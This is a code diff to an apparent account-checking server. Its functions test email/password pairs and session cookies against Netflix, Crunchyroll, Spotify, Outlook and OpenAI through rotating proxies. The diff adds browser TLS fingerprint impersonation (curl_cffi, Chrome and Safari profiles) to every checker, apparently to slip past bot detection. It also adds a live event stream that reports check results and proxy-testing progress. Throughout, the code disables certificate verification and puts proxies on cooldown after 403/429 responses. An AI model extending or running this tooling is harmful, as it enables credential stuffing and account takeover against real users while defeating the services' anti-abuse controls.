@@ -175,6 +175,96 @@ def get_cookie_fingerprint(text):
     return f"raw:{cleaned[:120]}"
 
 db_lock = threading.Lock()
+
+# ── TLS Fingerprint Spoofing (curl_cffi with requests fallback) ─────────────
+try:
+    import sys
+    if r'C:\Python314\Lib\site-packages' not in sys.path:
+        sys.path.append(r'C:\Python314\Lib\site-packages')
+    from curl_cffi import requests as curl_requests
+    CURL_CFFI_AVAILABLE = True
+except Exception as e:
+    curl_requests = None
+    CURL_CFFI_AVAILABLE = False
+    logging.warning(f"curl_cffi not available: {e}. Falling back to standard requests.")
+
+class TLSSessionWrapper:
+    """Wrapper around curl_cffi.requests.Session or requests.Session for 100% API compatibility."""
+    def __init__(self, raw_session, is_curl=True):
+        self._s = raw_session
+        self.is_curl = is_curl
+
+    def mount(self, prefix, adapter):
+        if hasattr(self._s, 'mount'):
+            self._s.mount(prefix, adapter)
+
+    def __getattr__(self, name):
+        return getattr(self._s, name)
+
+def create_tls_session(impersonate="chrome131", proxies=None, timeout=15):
+    """
+    Returns an HTTP Session with browser TLS/JA3/JA4 fingerprint impersonation.
+    Supports Chrome 131, Safari 18, etc.
+    """
+    if CURL_CFFI_AVAILABLE and curl_requests is not None:
+        try:
+            s = curl_requests.Session(impersonate=impersonate)
+            if proxies:
+                s.proxies = proxies
+            return TLSSessionWrapper(s, is_curl=True)
+        except Exception as ex:
+            logging.debug(f"Failed to create curl_cffi session with {impersonate}: {ex}")
+
+    s = requests.Session()
+    if proxies:
+        s.proxies = proxies
+    return TLSSessionWrapper(s, is_curl=False)
+
+def tls_request(method, url, impersonate="chrome131", **kwargs):
+    """Execute an HTTP request with browser TLS fingerprinting."""
+    if CURL_CFFI_AVAILABLE and curl_requests is not None:
+        try:
+            func = getattr(curl_requests, method.lower(), curl_requests.get)
+            return func(url, impersonate=impersonate, **kwargs)
+        except Exception as ex:
+            logging.debug(f"curl_cffi {method} failed, falling back to requests: {ex}")
+
+    kwargs.pop("impersonate", None)
+    func = getattr(requests, method.lower(), requests.get)
+    return func(url, **kwargs)
+
+# ── Server-Sent Events (SSE) Live Streaming Hub ──────────────────────────────
+_sse_clients = {}  # session_id -> list of queue.Queue
+_sse_lock = threading.Lock()
+
+def register_sse_client(session_id, q):
+    with _sse_lock:
+        if session_id not in _sse_clients:
+            _sse_clients[session_id] = []
+        _sse_clients[session_id].append(q)
+
+def unregister_sse_client(session_id, q):
+    with _sse_lock:
+        if session_id in _sse_clients:
+            if q in _sse_clients[session_id]:
+                _sse_clients[session_id].remove(q)
+            if not _sse_clients[session_id]:
+                del _sse_clients[session_id]
+
+def broadcast_sse(event_type, data, session_id=None):
+    with _sse_lock:
+        targets = []
+        if session_id and session_id in _sse_clients:
+            targets = list(_sse_clients[session_id])
+        elif not session_id:
+            for s_id, q_list in _sse_clients.items():
+                targets.extend(q_list)
+        for q in targets:
+            try:
+                q.put_nowait((event_type, data))
+            except queue.Full:
+                pass
+
 healthy_proxies = []
 all_tested_proxies = []
 proxy_lock = threading.Lock()
@@ -1384,6 +1474,8 @@ def start_background_proxy_test(limit=100, mode="untested"):
                     proxy_test_state["speed"] = round(speed, 1)
                     rem_items = max(0, total_cand - proxy_test_state["tested"])
                     proxy_test_state["eta_seconds"] = int(rem_items / speed) if speed > 0 else 0
+                    if proxy_test_state["tested"] % 10 == 0:
+                        broadcast_sse("proxy_progress", dict(proxy_test_state))
 
                 return p_copy
 
@@ -1422,6 +1514,7 @@ def start_background_proxy_test(limit=100, mode="untested"):
                     "dead": proxy_test_state["dead"],
                     "elapsed": int(time.time() - proxy_test_state["start_time"])
                 }
+                broadcast_sse("proxy_progress", dict(proxy_test_state))
 
     threading.Thread(target=_worker, daemon=True).start()
     lim_label = "semua" if (not limit or limit <= 0) else f"{limit}"
@@ -1682,7 +1775,7 @@ def generate_nftoken(cookie_text, use_proxy=True):
         route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
         try:
-            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=False)
+            res = tls_request("GET", API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=12, verify=False, impersonate="safari18_0")
             if res.status_code in (403, 429) and proxy_raw_url:
                 mark_proxy_cooldown(proxy_raw_url, 600)
             res.raise_for_status()
@@ -1744,7 +1837,7 @@ def check_netflix_membership(cookie_text, use_proxy=True):
         route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
         try:
-            session = requests.Session()
+            session = create_tls_session(impersonate="chrome131")
             ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
             headers['Cookie'] = ck_header
 
@@ -2500,7 +2593,7 @@ def check_crunchyroll_account(email, password, use_proxy=True):
             proxies = proxy_result[0]   # {"http": ..., "https": ...}
             route = proxy_result[1]     # "ip:port (latency)"
 
-    session = requests.Session()
+    session = create_tls_session(impersonate="chrome131")
     session.verify = False
 
     from requests.adapters import HTTPAdapter
@@ -2794,7 +2887,7 @@ def check_crunchyroll_cookie(cookie_text, use_proxy=True):
             route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
             proxy_raw_url = proxy_result[2]
 
-    session = requests.Session()
+    session = create_tls_session(impersonate="chrome131")
     session.verify = False
 
     from requests.adapters import HTTPAdapter
@@ -3107,7 +3200,7 @@ def check_spotify_cookie(cookie_text, use_proxy=True):
             route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
             proxy_raw_url = proxy_result[2]
 
-    session = requests.Session()
+    session = create_tls_session(impersonate="chrome131")
     session.verify = False
     session.headers.update(SPOTIFY_HEADERS)
     session.cookies.set("sp_dc", sp_dc, domain=".spotify.com")
@@ -3343,7 +3436,7 @@ def check_outlook_account(email, password, use_proxy=True):
             route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
             proxy_raw_url = proxy_result[2]
 
-    session = requests.Session()
+    session = create_tls_session(impersonate="chrome131")
     session.verify = False
     session.headers.update(OUTLOOK_HEADERS)
 
@@ -3664,7 +3757,7 @@ def check_openai_cookie(cookie_text, use_proxy=True):
             "Accept": "application/json",
         }
 
-        session = requests.Session()
+        session = create_tls_session(impersonate="chrome131")
         session.verify = False
         proxies = None
         proxy_label = "Direct"
@@ -4371,6 +4464,45 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.end_headers()
                 return
 
+        elif path.startswith("/api/stream/bulk") or path in ("/api/stream", "/api/stream/bulk"):
+            session_id = qs.get("session_id", ["default"])[0]
+            self.send_response(200)
+            self.send_header("Content-Type", "text/event-stream")
+            self.send_header("Cache-Control", "no-cache, no-transform")
+            self.send_header("Connection", "keep-alive")
+            self.send_header("X-Accel-Buffering", "no")
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.flush()
+
+            client_q = queue.Queue(maxsize=1000)
+            register_sse_client(session_id, client_q)
+            try:
+                init_msg = json.dumps({"session_id": session_id, "status": "connected"})
+                self.wfile.write(f"event: connected\ndata: {init_msg}\n\n".encode("utf-8"))
+                self.wfile.flush()
+
+                while True:
+                    try:
+                        ev_type, ev_data = client_q.get(timeout=15.0)
+                        if isinstance(ev_data, (dict, list)):
+                            ev_json = json.dumps(ev_data)
+                        else:
+                            ev_json = str(ev_data)
+                        msg = f"event: {ev_type}\ndata: {ev_json}\n\n".encode("utf-8")
+                        self.wfile.write(msg)
+                        self.wfile.flush()
+                    except queue.Empty:
+                        self.wfile.write(b": ping\n\n")
+                        self.wfile.flush()
+            except (BrokenPipeError, ConnectionResetError, socketserver.socket.error):
+                pass
+            except Exception as sse_err:
+                logging.debug(f"SSE client stream error: {sse_err}")
+            finally:
+                unregister_sse_client(session_id, client_q)
+            return
+
         elif path == "/api/health":
             uptime = int(time.time() - server_start_time)
             with proxy_lock:
@@ -5054,6 +5186,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 try:
                     p = json.loads(body.decode("utf-8"))
                     out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
+                    broadcast_sse("check_result", out, session_id=p.get("session_id"))
                     res = json.dumps(out).encode("utf-8")
                     self.send_response(200)
                 except Exception as e:
